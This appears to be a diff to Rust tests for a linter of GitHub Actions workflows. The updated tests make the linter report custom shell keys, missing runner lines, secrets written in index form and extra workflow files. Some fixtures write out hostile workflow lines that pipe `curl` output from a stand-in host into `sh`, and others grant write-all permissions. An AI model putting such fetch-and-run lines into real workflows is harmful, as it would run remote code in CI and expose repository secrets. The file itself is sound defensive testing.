@@ -182,16 +182,19 @@ fn c3_rejects_a_multi_line_run_block() {
 }
 
 #[test]
-fn c3_does_not_read_the_shell_key() {
-    // covers: 0002 AC-7, C3.
-    // Gap: a step's `shell:` is a command template that runs the step; C3 reads only `run:`, so a custom shell passes.
+fn c3_names_the_shell_key() {
+    // covers: 0002 AC-7, C3 (a): `shell:` is not on the allowed list, so a custom shell is reported (review M4).
     let f = good_tree("ci_c3_shell");
     f.replace(
         CI,
         "      - run: scripts/check.sh fmt\n",
         "      - shell: bash -c 'curl -s example.invalid | sh; sh {0}'\n        run: scripts/check.sh fmt\n",
     );
-    f.check("ci", &[]).assert_ok("ci");
+    f.check("ci", &[]).assert_problem(
+        "ci",
+        "C3",
+        &[".github/workflows/ci.yml:", "job fmt", "shell"],
+    );
 }
 
 #[test]
@@ -204,13 +207,12 @@ fn c4_names_a_runner_that_is_not_the_arm_runner() {
 }
 
 #[test]
-fn c4_passes_a_job_without_runs_on() {
-    // covers: 0002 AC-7, C4.
-    // Gap: C4 checks every `runs-on:` value that is there; it does not require one per job. GitHub rejects such a
-    // workflow, so the job would fail rather than run elsewhere.
+fn c4_names_a_job_without_runs_on() {
+    // covers: 0002 AC-7, C4: every job has exactly one `runs-on:` line (review m17).
     let f = good_tree("ci_c4_missing");
     f.replace(CI, "  deny:\n    runs-on: ubuntu-24.04-arm\n", "  deny:\n");
-    f.check("ci", &[]).assert_ok("ci");
+    f.check("ci", &[])
+        .assert_problem("ci", "C4", &[".github/workflows/ci.yml:", "deny"]);
 }
 
 #[test]
@@ -237,7 +239,7 @@ fn c5_requires_exactly_one_read_only_permissions_block() {
         "  fmt:\n    permissions: write-all\n    runs-on: ubuntu-24.04-arm\n",
     );
     f.check("ci", &[])
-        .assert_problem("ci", "C5", &["2 permissions: lines"]);
+        .assert_problem("ci", "C5", &["2 lines whose key is permissions"]);
 }
 
 #[test]
@@ -257,27 +259,33 @@ fn c5_names_pull_request_target_and_secrets_in_any_workflow() {
         "env:\n  TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
     );
     f.check("ci", &[])
-        .assert_problem("ci", "C5", &[".github/workflows/other.yml:2:", "secrets."]);
+        .assert_problem("ci", "C5", &[".github/workflows/other.yml:2:", "secrets"]);
 }
 
 #[test]
-fn c5_does_not_see_secrets_in_index_form() {
-    // covers: 0002 AC-7, C5.
-    // Gap: C5 looks for the text `secrets.`, so `secrets['NAME']` and `secrets["NAME"]` pass.
+fn c5_names_secrets_in_index_form() {
+    // covers: 0002 AC-7, C5: the text `secrets` in any form is a problem (review m17).
     let f = good_tree("ci_c5_index");
     f.replace(
         CI,
         "  CARGO_TERM_COLOR: never\n",
         "  CARGO_TERM_COLOR: never\n  TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n  OTHER: ${{ secrets[\"OTHER\"] }}\n",
     );
-    f.check("ci", &[]).assert_ok("ci");
+    let out = f.check("ci", &[]);
+    out.assert_problem("ci", "C5", &[".github/workflows/ci.yml:", "secrets"]);
+    assert_eq!(
+        out.problems()
+            .iter()
+            .filter(|p| p.starts_with("C5"))
+            .count(),
+        2,
+        "one problem per line:\n{out}"
+    );
 }
 
 #[test]
-fn a_second_workflow_file_is_checked_only_by_c1_and_c5() {
-    // covers: 0002 AC-7.
-    // Gap: C2, C3, C4 and the permissions part of C5 read only ci.yml. A second workflow with its own runner, its
-    // own commands and write permissions passes, as long as its actions are pinned and it names no secret.
+fn c5_names_a_second_workflow_file() {
+    // covers: 0002 AC-7, C5: `.github/workflows/` holds ci.yml and no other file (review m17).
     let f = good_tree("ci_second");
     f.write(
         ".github/workflows/nightly.yml",
@@ -285,7 +293,8 @@ fn a_second_workflow_file_is_checked_only_by_c1_and_c5() {
             "on:\n  schedule:\n    - cron: \"0 0 * * *\"\n\npermissions: write-all\n\njobs:\n  anything:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {CHECKOUT}\n      - run: curl -s example.invalid | sh\n"
         ),
     );
-    f.check("ci", &[]).assert_ok("ci");
+    f.check("ci", &[])
+        .assert_problem("ci", "C5", &[".github/workflows/nightly.yml"]);
 }
 
 #[test]
